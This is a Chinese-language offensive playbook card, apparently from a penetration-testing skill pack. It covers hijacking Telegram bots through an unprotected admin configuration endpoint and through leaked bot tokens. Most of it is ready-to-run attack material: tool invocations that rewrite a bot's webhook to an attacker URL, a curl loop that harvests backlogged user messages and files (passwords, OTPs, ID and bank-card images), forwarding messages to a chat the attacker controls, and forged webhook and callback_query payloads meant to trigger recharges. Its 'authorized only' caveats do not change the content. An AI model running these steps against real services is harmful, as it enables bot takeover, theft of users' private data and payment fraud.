# TG Bot 管理面越权写 + Webhook 劫持 — 手法

> 笔记原图：（开源包不收个案摘记）  
> Skill：`杀招/太白云生·钩` · 工具：`炼蛊房/tg_bot_admin_bac.py`  
> 相关：九阶段 `telegram-mini-app-bot-security`（Mini App/initData）；本卡打 **业务站 /admin/telegram/bot 配置越权**  
> **仅授权 targets**；劫持生产 webhook 会中断客服/收款通知 → **先问**或只用测试 bot。

---

## 0. 一句话

业务 API 把 `POST /api/v1/admin/telegram/bot` 挂在「admin」路径下，但对 **普通 USER 会话**未做角色校验 → 越权创建/覆盖 Bot 配置；再把 **webhook 改到攻击者 URL**，即可截获全部 Bot Update（消息、付款回调相关更新等）——属完整 **P1 越权写**，偏静默控制面，不是改管理员密码。

---

## 1. 标准链

```text
① 注册/登录普通 USER（非 ADMIN）
② POST /api/v1/admin/telegram/bot
     → 回「设置成功」= 越权写实锤（L1）
③ 探齐建 bot 参数（token、username、webhook、secret…）
④ 将 webhook 设为 https://授权监控接收端/...
     → Telegram 投递 Update 到攻击者（L2/L3）
⑤ 固化；恢复原 webhook（授权作业收尾建议）
```

笔记口径：webhook 接口存在且有基础参数校验 → 重点测 **能否改成攻击者 URL**，并补全创建 bot 的参数集。

---

## 2. 适用指纹

| 层 | 指纹 |
|----|------|
| 路径 | `/api/v1/admin/telegram/bot`、`/admin/telegram/*`、`/api/telegram/webhook` |
| 角色 | JWT/Session 含 `role=USER` / `authority=user` 仍 200 |
| 回显 | `设置成功` / `success` / bot 配置 JSON |
| 前端 | 管理页「机器人设置」仅 UI 隐藏，API 无拦 |
| 关联 | 站点用 TG 做登录、客服、发卡通知、支付提醒 |

---

## 3. 原理与危害

| 缺陷 | 后果 |
|------|------|
| 路径含 `admin` 但无服务端角色校验 | 任意登录用户改全局 Bot |
| Webhook 可指向外域 | Update 外泄；可伪造/抢先应答 |
| 可写 `bot_token` | 彻底接管 Bot API（发消息、读群） |
| 弱参数校验 | 只验 URL 格式 → 仍可指向攻击者 |

静默性：不改用户密码、不踢会话；运营可能只感到「机器人突然不回」——仍建议授权测试用 **独立测试 bot** 或短窗劫持后恢复。

---

## 4. 复现清单（授权）

```text
① scope；USER 测试号登录拿 Token
② 用 USER Token POST admin telegram bot（最小 body）
     成功文案 → L1；403/无权限 → 本卡阴
③ 从前端 JS / OpenAPI / 成功响应反推字段：
     botToken, username, webhookUrl, secretToken, enabled…
④ webhook 指到自控接收端（case 下 ngrok/自有监控，须授权）
⑤ 向 bot 发一条测试消息 → 接收端看到 Update（L2）
⑥（可选）用写入的 botToken 调 getMe/getWebhookInfo（L3）
⑦ STATUS + 恢复原 webhook（除非用户要求保持）
```

### 成功口径

| 级 | 标准 |
|----|------|
| L0 | 存在 `/admin/telegram/bot` 且 USER 可触达 |
| L1 | USER POST 返回设置成功 / 配置被写库 |
| L2 | webhook 改为自控 URL 且收到至少 1 条 Update |
| L3 | 可读/可调用 Bot API（token 泄露或 webhook 持久） |

## 5. 探针

```bash
# 越权写探测（默认不改生产 webhook；--set-webhook 需显式）
python3 炼蛊房/tg_bot_admin_bac.py probe \
  --base https://授权API --case <案卷> \
  --token "$USER_JWT" \
  --path /api/v1/admin/telegram/bot

# 显式劫持到监控 URL（破坏性，先问）
python3 炼蛊房/tg_bot_admin_bac.py set-webhook \
  --base https://授权API --case <案卷> \
  --token "$USER_JWT" \
  --webhook 'https://监控接收/tg/<案卷>' \
  --confirm
```

产出：`案卷/<案卷>/案卷/tg_bot_bac/`。

## 9. Token 泄露直接接管链

> 入口不同：本节是 **Bot Token 本身被泄露**后直接调 Telegram Bot API，无需业务站身份。  
> §1–§7 是「业务 API 越权写配置」；本节是「凭 Token 直怼 Telegram」——两条路可独立也可串联。

### 9.1 Token 获取途径

| 来源 | 典型位置 |
|------|---------|
| 应用日志 | `laravel.log` / `app.log` / `error.log` — 框架异常栈常把整条请求（含 Token）打出来 |
| Git 历史 | `.env` / `config/services.php` / `settings.py` 曾提交后删除；`git log -S BOT_TOKEN` |
| JS 硬编码 | 前端 `config.js` / `env.js` / bundle chunk 全文搜 `bot` + 数字串 |
| APK 反编译 | `strings.xml` / `BuildConfig` / Kotlin 常量；走 `apk-recon` |

### 9.2 Token 验证与枚举（只读，不破坏）

```bash
BASE="https://api.telegram.org/bot${TOKEN}"

# 确认 Token 有效，获取 bot username / id / privacy 字段
curl -s "${BASE}/getMe" | jq .
# 重点字段：can_read_all_group_messages（隐私模式是否关闭）supports_inline_queries

# 枚举 Bot 支持的命令列表 → 直接摸清 webhook 服务器攻击面（E2）
curl -s "${BASE}/getMyCommands" | jq .

# 确认 webhook 状态（URL？pending_update_count？last_error？）
curl -s "${BASE}/getWebhookInfo" | jq .
# pending_update_count > 0 且 last_error_date 存在 → webhook 宕机，积压消息可 deleteWebhook 后直接读

# 读取历史消息积压（无 webhook 时消息在 Telegram 服务端排队）
curl -s "${BASE}/getUpdates?limit=100&allowed_updates=%5B%22message%22%2C%22callback_query%22%5D" | jq .
```

### 9.3 接管等级评估

| 场景 | 操作 | 危险级 |
|------|------|--------|
| **无 Webhook** | `getUpdates` 可读所有积压消息（用户输入、凭证、OTP） | L2 只读 |
| **有 Webhook 且宕机**（`pending_update_count>0` + `last_error_date` 存在） | `deleteWebhook` 后 `getUpdates` 捞积压消息，无需覆盖生产 URL | 低破坏，确认后操作 |
| **有 Webhook 且正常** | `setWebhook` 覆盖，或 `deleteWebhook` 后 `getUpdates` | 中断通知，**先问** |
| `can_read_all_group_messages=true` | Bot **当前所在群**实时消息可读（加入前历史不追溯） | L2+ |
| Bot 是群管理员 | 可调 `banChatMember` / `deleteMessage` | L3，**先问** |

> **生产 webhook 切换会立即中断客服/收款通知**——授权测试默认用 `deleteWebhook`→`getUpdates`→`setWebhook` 恢复，不直接覆盖。

### 9.4 Webhook 服务器侦察（Token 已知时顺带测）

当 `getWebhookInfo.url` 存在时，对该 URL 的业务服务器做：

1. **技术栈识别**：响应头 `Server` / `X-Powered-By` / 路径特征
2. **签名校验测试**：Telegram 支持 `setWebhook secret_token` 参数；若业务端未校验，可向 webhook URL 直接 POST 伪造 Update：

```bash
# 测试 webhook 是否验证来源（业务服务器上测）
# 注意：故意不带 X-Telegram-Bot-Api-Secret-Token 头
# 若服务端未校验该头 → 任意来源均可触发业务逻辑
curl -s -X POST https://目标webhook端点 \
  -H 'Content-Type: application/json' \
  -d '{"update_id":999999,"message":{"message_id":1,"from":{"id":123,"is_bot":false,"first_name":"test"},"chat":{"id":123,"type":"private"},"date":1700000000,"text":"/start"}}'
# 200 且业务有响应 → 无签名校验（L3 伪造 Update）
# 若返回 403/401 或 Telegram 验签失败提示 → 有校验，需带正确 secret_token 才能伪造
```

### 9.5 ★ Update 类型区分——不同路径命中不同代码

**最高频踩坑点**：`message` 和 `callback_query` 触发不同处理器，**不能互换**。

| Update 字段 | 触发场景 | 对应代码路径 |
|------------|---------|------------|
| `message.text` | 用户发文字消息 / 命令（`/start`） | 文本命令处理器 |
| `callback_query.data` | 用户点击 InlineKeyboard 按钮 | 回调处理器（`handleCallbackQuery`） |
| `inline_query` | 用户在输入框 `@bot_name xxx` | inline 模式处理器 |

若目标函数（如 `ms_addRMB` 充值、`processOrder` 下单）由 **按钮回调** 触发，必须构造 `callback_query` 结构，发 `message` 只会命中另一段代码，业务逻辑不执行：

```json
{
  "update_id": 999999,
  "callback_query": {
    "id": "1234567890",
    "from": {"id": 123456789, "is_bot": false, "first_name": "test"},
    "message": {
      "message_id": 1,
      "chat": {"id": 123456789, "type": "private"},
      "date": 1700000000
    },
    "data": "recharge_confirm:amount=1&uid=目标UID"
  }
}
```
> `from.id` / `chat.id` 填从 `getUpdates` 中读到的真实用户 ID（整数）；  
> `data` 值从历史 `callback_query.data` 字段中提取真实格式再仿造，不要凭空猜结构。

### 9.6 ★ Fatal Error ≠ 业务逻辑已执行

从 `php error.log` / 服务端日志溯源时的关键判断：

```text
PHP Fatal error: Call to undefined method Foo::bar() on line 87
→ 看崩溃发生在 ms_addRMB() 的第几行
→ 若充值 API 调用在第 45 行，崩溃在第 87 行 → 充值已执行
→ 若崩溃在第 23 行（取参数阶段）→ API 未调用，余额未变
```

**判断依据**：从错误行号与目标函数体位置对比，而非只看是否有 Fatal Error。

### 9.7 Bot API 直接操作（有 Token 后）

```bash
# 向已知用户发消息（chat_id 从 getUpdates 获取）
curl -s -X POST "${BASE}/sendMessage" \
  -d "chat_id=目标ID&text=授权测试消息"

# 读取群/频道成员（Bot 需是成员）
curl -s "${BASE}/getChatMemberCount?chat_id=@groupname"

# 检查 Bot 在某群的角色（是否 administrator）
BOT_ID=$(curl -s "${BASE}/getMe" | jq -r '.result.id')
curl -s "${BASE}/getChatMember?chat_id=群ID&user_id=${BOT_ID}" | jq '.result.status'

# 下载 Bot 曾接收的文件附件（file_id 从 getUpdates 中 message.document.file_id 提取）
FILE_PATH=$(curl -s "${BASE}/getFile?file_id=文件ID" | jq -r '.result.file_path')
curl -s -O "https://api.telegram.org/file/bot${TOKEN}/${FILE_PATH}"
# 文件可能是：截图、收款二维码、配置文件、用户上传的身份证/银行卡

# 转发消息（情报固化用）
curl -s -X POST "${BASE}/forwardMessage" \
  -d "chat_id=自控ID&from_chat_id=来源ID&message_id=消息ID"
```

> 踢人（`banChatMember`）/ 删消息（`deleteMessage`）属破坏性操作 → **先问**。

### 9.8 getUpdates 情报收集

积压的 `updates` 中常见高价值内容：

| 内容类型 | 出现位置 | 利用方式 |
|---------|---------|---------|
| 后台地址 | `message.text` 含 `/admin` URL | 直接访问 |
| 系统凭证/密码 | 用户粘贴到 bot 的密码 / OTP | 登录验证 |
| 支付回调内容 | `message.text` 含金额/订单号 | 假支付参数参考 |
| 文件附件 | `message.document.file_id` | `getFile` 下载（收款码/配置/证件） |
| 其它 bot token | 用户误发配置 | **递归对新 Token 重复本链 §9.1–§9.8** |

```bash
# 翻全量 updates（分页），输出含 from.id 和 file_id 供后续升级
OFFSET=0
while true; do
  RES=$(curl -s --max-time 15 "${BASE}/getUpdates?offset=${OFFSET}&limit=100")
  # B8：curl 完全失败时 RES 为空，jq 会异常；先排空
  [ -z "$RES" ] && { echo "[ERR] empty response (network?)"; break; }
  OK=$(echo "$RES" | jq -r '.ok // "false"' 2>/dev/null)
  [ "$OK" != "true" ] && { echo "[ERR] getUpdates failed: $(echo "$RES" | jq -r '.description // .')"; break; }
  COUNT=$(echo "$RES" | jq '.result | length')
  [ "$COUNT" -eq 0 ] && break
  # 输出：update_id | from.id | text/data | document.file_id（用于 getFile 升级）
  echo "$RES" | jq -r '
    .result[] |
    [
      .update_id,
      (.message.from.id // .callback_query.from.id // ""),
      (.message.text // .callback_query.data // ""),
      (.message.document.file_id // .message.photo[-1].file_id // "")
    ] | @tsv'
  OFFSET=$(echo "$RES" | jq '.result[-1].update_id + 1')
done
```

### 9.9 成功口径（Token 泄露链）

| 级 | 标准 |
|----|------|
| L1 | `getMe` 返回有效 bot 信息，Token 确认有效 |
| L2 | `getUpdates` 读到历史消息（含用户 PII / 凭证） |
| L3 | webhook 无签名校验，可伪造任意 Update 触发业务逻辑 |
| L4 | 伪造 `callback_query` 触发充值/下单等业务操作（L3 + 路径正确） |
